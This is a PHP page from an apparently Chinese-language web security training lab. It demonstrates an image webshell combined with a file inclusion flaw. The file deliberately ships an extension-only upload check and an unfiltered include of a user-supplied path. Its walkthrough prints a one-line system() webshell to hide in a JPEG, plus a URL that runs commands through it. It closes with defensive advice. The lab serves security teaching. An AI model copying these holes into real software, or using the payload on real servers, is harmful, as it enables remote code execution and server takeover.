<?php
// 图片马+文件包含漏洞
$module_name = '图片马+文件包含';
$module_icon = '🖼️';
$module_desc = '上传包含PHP代码的图片文件，然后通过文件包含漏洞执行其中的代码。';

// 漏洞代码
$message = '';
$uploaded_file = '';
$include_result = '';

// 处理文件上传
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    
    // 仅验证文件扩展名是否为图片
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
    $file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if (!in_array($file_ext, $allowed_ext)) {
        $message = '仅允许上传图片文件！';
    } else {
        $upload_dir = 'uploads/';
        if (!file_exists($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }
        
        $target_file = $upload_dir . basename($file['name']);
        
        if (move_uploaded_file($file['tmp_name'], $target_file)) {
            $message = '文件上传成功！';
            $uploaded_file = $target_file;
        } else {
            $message = '文件上传失败！';
        }
    }
}

// 处理文件包含
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    // 漏洞：直接包含用户指定的文件，没有过滤
    ob_start();
    include($file);
    $include_result = ob_get_clean();
}

// 页面内容
$content = '<div class="card">
        <div class="card-header">
            <h5 class="mb-0">🖼️ 图片马+文件包含</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                本场景演示图片马+文件包含漏洞。<br>
                攻击者可以上传包含PHP代码的图片文件（图片马），然后通过文件包含漏洞执行其中的PHP代码。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <h5 class="mb-2">文件上传代码：</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    
    // 仅验证文件扩展名是否为图片
    $allowed_ext = ['jpg', 'jpeg', 'png', 'gif'];
    $file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if (!in_array($file_ext, $allowed_ext)) {
        $message = '仅允许上传图片文件！';
    } else {
        $upload_dir = 'uploads/';
        if (!file_exists($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }
        
        $target_file = $upload_dir . basename($file['name']);
        
        if (move_uploaded_file($file['tmp_name'], $target_file)) {
            $message = '文件上传成功！';
        } else {
            $message = '文件上传失败！';
        }
    }
}</code></pre>
                    
                    <h5 class="mb-2 mt-4">文件包含代码：</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_GET['file'])) {
    $file = $_GET['file'];
    // 漏洞：直接包含用户指定的文件，没有过滤
    include($file);
}</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景演示图片马+文件包含漏洞，尝试以下攻击步骤：</p>

                    <h5 class="mb-2">步骤1：创建图片马</h5>
                    <ol>
                        <li>准备一张正常的图片文件，例如：<code>test.jpg</code></li>
                        <li>使用文本编辑器打开图片文件，在文件末尾添加PHP代码：</li>
                        <pre class="bg-dark text-light p-3 rounded"><code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code></pre>
                        <li>保存文件，保持扩展名不变（如：<code>test.jpg</code>）</li>
                    </ol>

                    <h5 class="mb-2 mt-4">步骤2：上传图片马</h5>
                    <ol>
                        <li>使用下方的文件上传表单上传创建的图片马</li>
                        <li>记录上传成功后的文件路径</li>
                    </ol>

                    <h5 class="mb-2 mt-4">步骤3：通过文件包含执行代码</h5>
                    <ol>
                        <li>在浏览器中访问：<code>http://localhost/zhaosec/upload/image_include.php?file=uploads/test.jpg&cmd=whoami</code></li>
                        <li>将<code>uploads/test.jpg</code>替换为实际的上传路径</li>
                        <li>查看执行结果，应该显示当前系统用户</li>
                    </ol>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 实际测试</h6>
                </div>
                <div class="card-body">
                    <h5 class="mb-3">文件上传</h5>
                    <form method="POST" enctype="multipart/form-data" class="mb-5">
                        <div class="mb-3">
                            <label for="file" class="form-label">选择图片文件</label>
                            <input type="file" name="file" id="file" class="form-control" accept="image/*">
                        </div>
                        <button type="submit" class="btn btn-danger">上传文件</button>
                    </form>

                    <h5 class="mb-3">文件包含测试</h5>
                    <form method="GET" class="mb-3">
                        <div class="input-group">
                            <span class="input-group-text">文件路径</span>
                            <input type="text" name="file" class="form-control" placeholder="例如：uploads/test.jpg">
                            <span class="input-group-text">命令</span>
                            <input type="text" name="cmd" class="form-control" placeholder="例如：whoami">
                            <button type="submit" class="btn btn-danger">执行包含</button>
                        </div>
                    </form>

                    ';

if ($message) {
    if (strpos($message, '成功') !== false) {
        $content .= '<div class="alert alert-success">
                        <strong>上传结果：</strong>
                        <p>' . htmlspecialchars($message) . '</p>';
        if ($uploaded_file) {
            $content .= '<p>上传文件路径：<code>' . htmlspecialchars($uploaded_file) . '</code></p>';
            $content .= '<p>包含测试链接：<a href="image_include.php?file=' . htmlspecialchars($uploaded_file) . '&cmd=whoami" target="_blank">点击测试</a></p>';
        }
        $content .= '</div>';
    } else {
        $content .= '<div class="alert alert-danger">
                        <strong>上传结果：</strong>
                        <p>' . htmlspecialchars($message) . '</p>
                    </div>';
    }
}

if ($include_result) {
    $content .= '<div class="alert alert-secondary">
                        <strong>文件包含结果：</strong>
                        <pre class="mb-0 mt-2"><code>' . htmlspecialchars($include_result) . '</code></pre>
                    </div>';
}

$content .= '                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>文件内容验证：</strong>检查文件头部特征，确保文件类型与扩展名匹配</li>
                        <li><strong>文件包含过滤：</strong>对文件包含的路径进行严格过滤，使用白名单</li>
                        <li><strong>重命名文件：</strong>使用随机文件名，避免路径遍历攻击</li>
                        <li><strong>存储位置：</strong>将上传文件存储在Web根目录外，或使用不可执行的目录</li>
                        <li><strong>权限控制：</strong>设置上传目录为不可执行，限制文件权限</li>
                        <li><strong>禁用危险函数：</strong>在php.ini中禁用system等危险函数</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>